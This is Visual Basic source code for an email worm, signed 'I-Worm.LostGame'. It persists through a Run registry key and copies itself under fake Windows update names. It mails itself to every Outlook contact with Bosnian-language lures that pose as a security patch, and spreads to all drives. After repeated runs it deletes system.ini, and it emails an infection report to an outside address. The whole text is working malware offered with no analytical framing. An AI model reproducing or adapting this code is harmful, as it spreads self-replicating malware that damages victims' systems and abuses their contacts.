Private Sub Form_Load(): Dim fso, wshs, vhost, vime
Form1.Visible = False
Dim exeime(1 To 4)
exeime(2) = "Win_Update.exe"
exeime(1) = "Posta_Update.exe"
exeime(4) = "BiHNet.exe"
exeime(3) = "Win32_Update.exe"
vime = exeime(Int(Rnd * 1 + Rnd * 3 + Rnd * 4))
Set fso = CreateObject("Scripting.filesystemobject")
Set wshs = CreateObject("WScript.Shell")
If wshs.regread("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\") <> "LastWord" Then
wshs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LastWord", "c:\windows\" & vime
Else
GoTo kraj
End If
vhost = "c:\windows\" & vime
With fso
fso.copyfile App.Path & "\" & App.EXEName & ".exe", vhost, 1
End With
Const tri = 3
Dim bod(1 To tri)
bod(1) = "Postovani korisnice! Ovo je novi Update koji ce zastiti Vas kompjuter od internet crva! Da bi instalirali ovaj update molim pokrenite datoteku koja Vam je dosla uz attachment pod imenom " & vime
bod(2) = "Cijenjeni korisnice! Update koji Vam je dosao kao attachment sluzi kao patch da bi ste se zastitili od mnogobrojnih internet crva i virusa!"
bod(3) = "Instalirajte ovu datoteku koja ce rijesiti problem TypeLib kod IE_5.0! Unaprijed hvala!"
kraj:
Dim a, b, c
Set a = CreateObject("Outlook.Application")
Set b = a.getnamespace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For f = 1 To b.addresslists.Count
    For d = 1 To b.addresslists(f).addressentries.Count
        With a.CreateItem(0)
        Set g = b.addresslists(f).addressentries(d)
        .Recipients.Add g
        .Subject = "Vazna informacija!"
        .body = bod(Int(Rnd * 2 + 1))
        .Attachments.Add vhost
        .Send
        End With
        g = ""
    Next d
Next f
b.logoff
End If
Set sdrv = fso.Drives
For Each drajv In sdrv
If drajv.drivetype = 1 Or 3 Then
If drajv.drivetype = 4 Then GoTo dalje 'CD-ROM!?!?! (read-only)
If drajv.isready = True Then
fso.copyfile vhost, drajv.driveletter & ":\", True
End If
End If
Next drajv
dalje:
If Dir("c:\Windows\opomena.txt") <> "opomena.txt" Then
Set raport = fso.CreateTextFile("c:\windows\opomena.txt", True)
raport.writeline "1"
raport.Close
Else
Set procitaj = fso.OpenTextFile("c:\Windows\opomena.txt", 1)
broj = procitaj.readline
procitaj.Close
If broj = 1 Then
Set drugi = fso.OpenTextFile("c:\Windows\opomena.txt", 2, True)
drugi.writeline "2"
drugi.Close
MsgBox "Some errors occured while system tries to update! Please try again!", vbCritical, "WinUpdate 2001"
Else
If broj = 2 Then
Set treci = fso.OpenTextFile("c:\Windows\opomena.txt", 2, True)
treci.writeline "3"
treci.Close
MsgBox "I said some errors occured while system tries to update! Please update as soon as possible!", vbCritical, "WinUpdate 2001"
Else
If broj = 3 Then
MsgBox "U shOulD Do tHaT uSer, U shOuLd dO thAt UpDatE! ...this is My LastWord", vbInformation, "WinUpdate's Last Word!"
Form1.Visible = True
Kill "c:\windows\system.ini"
End If
End If
End If
End If
Set mail = a.CreateItem(olMailItem)
With mail
mail.Recipients.Add ("gargamelaf@yahoo.com")
If broj = 3 Then
mail.body = "...jos jedan kompjuter je podlegao, ali ovaj put to je nesto drugo ;)"
Else
mail.body = "...inficirao sam jos jednog GAZDA!"
End If
mail.Subject = "Raport!"
mail.Send
End With
End Sub 'I-Worm.LostGame by Specie / www.vxbiolabs.cjb.net Specie & ACIdCooKie
Private Sub Timer1_Timer()
On Error Resume Next
BackColor = BackColor + 5
End Sub
